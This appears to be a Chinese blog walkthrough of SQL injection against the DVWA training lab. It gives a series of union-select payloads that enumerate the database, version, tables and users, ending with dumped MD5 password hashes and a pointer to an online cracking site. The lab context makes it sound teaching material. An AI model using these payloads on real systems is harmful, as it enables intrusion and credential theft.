# SQL注入产生的原因

客户端访问动态网页时，服务器会向数据访问层发起SQL查询请求，调取数据库中的数据。

实际情况中，服务器向数据访问层发起的SQL查询请求需要结合用户输入的数据动态构造SQL语句，所以当用户输入非法或恶意的代码时，就有可能构造出恶意的SQL语句被执行，造成以下威胁：

- 猜解后台数据库，这是利用最多的方式，盗取网站的敏感信息。
- 绕过认证，列如绕过验证登录网站后台。
- 注入可以借助数据库的存储过程进行提权等操作



# 使用DVWA靶场进行测试

![](https://yvling-blog-image-1257337367.cos.ap-shanghai.myqcloud.com/%E5%8D%9A%E5%AE%A2/DVWA%E9%9D%B6%E5%9C%BASQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/2022-03-28/DVWA%E9%9D%B6%E5%9C%BA.png)

### 一、安全级别：low

1、输入框中输入1，提交，查看回显。

![](https://yvling-blog-image-1257337367.cos.ap-shanghai.myqcloud.com/%E5%8D%9A%E5%AE%A2/DVWA%E9%9D%B6%E5%9C%BASQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/2022-03-28/Low_%E5%9B%9E%E6%98%BE.png)

 (URL中ID=1，说明php页面通过 **get** 方法传递参数)

2、查看网页源码，找到关键的SQL语句。

![](https://yvling-blog-image-1257337367.cos.ap-shanghai.myqcloud.com/%E5%8D%9A%E5%AE%A2/DVWA%E9%9D%B6%E5%9C%BASQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/2022-03-28/Low_%E6%BA%90%E7%A0%81.png)

实际执行的SQL语句：

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1';
```

即通过控制参数 id 的值来获取信息。

3、尝试通过特殊的输入来构造SQL语句，并让数据库能够执行。

在输入框中输入 *1‘ order by 1#*

那么实际传递给数据库的SQL语句就会变成：

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' order by 1 #';
```

按照SQL的语法，#后的字符均被解释为注释。

那么这条语句就变为：查询users表中id为1的数据并按第一字段排序。

查看返回结果：

```
ID: 1' order by 1 #
First name: admin
Surname: admin
```

改变排序的字段，当输入为 *1‘ order by 3#*时返回错误，说明users表中只有两个字段。

4、使用 **union select** 联合查询语句获取更多信息。

①查询当前数据库名称及执行查询的用户名称

输入：*1' union select database(),user() #*

- database() 将会返回当前网站所使用的数据库名字.
- user() 将会返回执行当前查询的用户名.

查看返回结果：

```
ID: 1' union select database(),user() #
First name: admin
Surname: admin
ID: 1' union select database(),user() #
First name: dvwa
Surname: dvwa@localhost
```

成功获知：

- 当前使用的数据库为：dvwa。
- 当前执行查询的用户为：dvwa@localhost。

②查询当前数据库版本和当前操作系统

输入：*1' union select version(),@@version_compile_os #*

- version() 获取当前数据库版本.
- @@version_compile_os 获取当前操作系统。

查看返回结果：

```
ID: 1' union select version(),@@version_compile_os #
First name: admin
Surname: admin
ID: 1' union select version(),@@version_compile_os #
First name: 5.1.41-3ubuntu12.6-log
Surname: debian-linux-gnu
```

成功获知：

- 当前数据库版本为 : 5.1.41-3ubuntu12.6-log
- 当前操作系统为 : debian-linux-gnu

③查询当前数据库中的表名

**information_schema** 是 mysql 自带的一个数据库，这个数据库保存了 Mysql 服务器所有数据库的信息,如数据库名，数据库的表，表栏的数据类型与访问权限等。该数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库。

输入：

*1' union select table_name,table_schema from information_schema.tables where table_schema='dvwa' #*

查看返回结果：

```
ID: *1' union select table_name,table_schema from information_schema.tables where table_schema='dvwa' #
First name: guestbook
Surname: dvwa
ID: *1' union select table_name,table_schema from information_schema.tables where table_schema='dvwa' #
First name: users
Surname: dvwa
```

成功获知：

- dvwa 数据库有两个数据表，分别是 guestbook 和 users 。

④查询用户名和密码

由经验可以猜测 users 表的字段为 **user** 和 **password**。

输入：*1' union select user,password from users #*

查看返回结果：

```
ID: 1' union select user,password from users #
First name: admin
Surname: admin
ID: 1' union select user,password from users #
First name: admin
Surname: 21232f297a57a5a743894a0e4a801fc3
ID: 1' union select user,password from users #
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03
ID: 1' union select user,password from users #
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
ID: 1' union select user,password from users #
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
ID: 1' union select user,password from users #
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
ID: 1' union select user,password from users #
First name: user
Surname: ee11cbb19052e40b07aac0ca060c23ee
```

成功获取表中的用户名和密码。

密码使用MD5加密，可以到 www.cmd5.com 进行解密。



